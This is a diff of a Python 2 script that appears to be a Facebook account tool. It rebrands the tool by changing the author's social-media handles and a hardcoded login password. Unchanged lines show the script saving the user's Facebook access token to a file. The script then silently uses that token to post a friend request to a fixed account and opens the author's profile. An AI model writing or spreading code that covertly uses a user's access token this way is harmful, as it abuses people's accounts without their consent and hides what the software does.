@@ -55,8 +55,8 @@ logo = """
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92m Rafin
 \033[1;96mInstagram \033[1;93m: \033[1;Flow Rafin
-\033[1;96mFacebook  \033[1;93m: \033[1; I.Fuek.YoUr.MiND.BnXD
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/Rafin
+\033[1;96mFacebook  \033[1;93m: \033[1; I.FueK.YoUr.MiNd.BnXD
+\033[1;96mGithub \033[1;93m: \033[1;92https://github.com/RafinAhmed44
 \033[1;91m======================================="""
 
 def tik():
@@ -79,13 +79,13 @@ print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mRafin
 \033[1;96mInstagram \033[1;93m: \033[1;92mFlowRafin
-\033[1;96mFacebook  \033[1;93m: \033[1;92m I.Fuek.YoUr.MiND.BnXD
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/Rafin
+\033[1;96mFacebook  \033[1;93m: \033[1;92m I.FueK.YoUr.MiNd.BnXD
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/RafinAhmed44
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "Mithi"
-CorrectPassword = "Mithi"
+CorrectUsername = "SHMITHI"
+CorrectPassword = "SHMITHI"
 
 loop = 'true'
 while (loop == 'true'):
@@ -141,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.facebook.com/I.FueK.YoUr.MiNd.BnXD')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
